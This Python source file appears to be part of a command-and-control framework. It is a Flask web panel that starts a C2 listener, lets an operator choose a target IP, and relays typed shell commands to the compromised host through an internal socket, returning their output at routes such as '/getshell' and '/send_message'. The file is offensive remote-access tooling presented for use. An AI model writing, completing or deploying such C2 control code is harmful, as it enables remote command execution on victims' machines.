from flask import *
import os
from .IntrnalSocketServer import IntrnalSocketServer
import threading

class FlskSevrev(object):
    
    def __init__(self,c2Server):
        self._internalSock = IntrnalSocketServer()
        self._internalSock.start()
        self.app = Flask(__name__, static_folder=os.path.join(os.getcwd(),'templates','static'))
        self.c2Server = c2Server
        self.targetConnction = c2Server.Connection
        self._c2Thread = threading.Thread(target = c2Server.__listener__).start()
        self._ruleResetor()
        

    def getshell(self,hostname):
        return render_template('index.html',hostname=hostname)
    
    def choseTarget(self,targetIp):
        self.c2Server.connected = targetIp


    def send_message(self):
        data = request.get_json()
        message = data['message']
        self._internalSock._send_msg(message.encode())
        msg = self._internalSock._read_msg().decode(errors='replace')
        return {'message': msg}
    
    def getConnectedHostname(self):
        self._internalSock._send_msg(b'hostname')
        host = self._internalSock._read_msg().decode(errors='replace')
        return f"{host}: admin"
    
    def _ruleResetor(self):
        self.app.add_url_rule('/getshell/<hostname>', 'getshell', self.getshell)
        self.app.add_url_rule('/send_message', 'send_message', self.send_message, methods=['POST'])
        self.app.add_url_rule(
            '/getConnectedHostname', 
            'getConnectedHostname', 
            self.getConnectedHostname, 
        )
    
    
